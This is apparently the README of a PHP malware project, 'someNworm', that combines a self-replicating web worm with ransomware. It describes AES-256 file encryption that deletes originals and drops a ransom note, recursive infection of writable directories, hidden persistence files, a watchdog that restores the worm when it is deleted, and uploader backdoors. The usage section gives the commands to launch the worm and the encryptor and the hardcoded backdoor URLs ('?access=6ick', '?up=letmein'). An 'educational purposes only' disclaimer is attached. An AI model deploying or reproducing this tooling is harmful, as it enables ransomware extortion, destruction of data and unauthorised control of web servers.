# 🪱 someNworm

![License](https://img.shields.io/badge/license-MIT-green.svg)
![PHP](https://img.shields.io/badge/php-7.4%2B-orange.svg)
![Status](https://img.shields.io/badge/status-stable-success.svg)
![Made with](https://img.shields.io/badge/Made%20with-💀%206ickZone-black.svg)

> *"Where Creativity, Exploitation, and Expression Collide."* — 0x6ick

**Hybrid Worm Project** featuring Auto-Replication, AES Encryption, Obfuscation, and Self-Healing mechanisms.

---

## 📂 Structure & Modules

| Folder | File | Description |
| :--- | :--- | :--- |
| **some/v1/** | `en.php` / `de.php` | **Basic:** Simple Base64 + Gzdeflate encoder/decoder. |
| **some/v2/** | `encrypt2.php` | **Stealth:** AES-256-CBC, renames files to `.6ickZone`, drops ransom note. |
| **some/v2/** | `decrypt2.php` | **Recover:** Decrypts v2 files (Requires correct Key). |
| **worm/** | `worm.php` | **Dropper:** Recursive infection + Uploader backdoor (`?access=6ick`). |
| **worm/** | `guard.php` | **Watchdog:** Restores `worm.php` instantly if deleted. |
| **worm/** | `worm2.php` | **v2.3s:** new variant with activity logging (`.spreadlog.txt`). |
| **/** | `standalone.php` | **GUI Tool:** Lock/Unlock interface with generated Keys. |

---

## ⚔️ Capabilities

### 1. Encryption Engine
* **v1 (Lightweight):** Fast, keeps filenames, uses fixed IV.
* **v2 (Heavy):** Uses **AES-256-CBC** with **Random IV**. Renames files, deletes originals, and creates `!!!DECRYPT_ME!!!.html`.

### 2. Worm Mechanics
* **Spread:** Recursively scans all writable directories.
* **Persistence:** Drops `.syscore.php` hidden backups.
* **Defense:** `guard.php` for heal.

---

## 💀 Usage / Payloads

```bash
# Activate Worm
php worm/worm.php

# Encrypt System (v2)
php some/v2/encrypt2.php
```

# Uploader Access

**1. worm.php**
```
target.com/worm.php?access=6ick
```

**2. worm2.php**
```
target.com/worm2.php?up=letmein
```

---

## ⚠️ Legal & Disclaimer
**FOR EDUCATIONAL PURPOSES ONLY.**  
Do not use these examples on systems you do not own.  
The author (**0x6ick**) is not responsible for misuse.

---

## 👤 Author
**0x6ick**

## 📄 License
MIT License

> "Some worms spread chaos. Others spread knowledge."
